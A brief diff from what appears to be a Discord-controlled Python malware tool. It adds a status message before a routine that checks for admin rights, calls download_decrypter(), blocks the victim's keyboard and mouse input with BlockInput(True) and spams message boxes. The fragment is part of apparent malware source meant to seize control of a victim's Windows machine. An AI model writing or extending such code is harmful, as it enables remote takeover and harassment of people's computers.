@@ -443,6 +443,7 @@ async def SendMessageBox_command(ctx: SlashContext):
         if res.component.label == "YES":
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if is_admin == True:
+                await ctx.send("Downloading decrypter and sending message box!")
                 download_decrypter()
                 ok = windll.user32.BlockInput(True)
                 spam_messagebox()
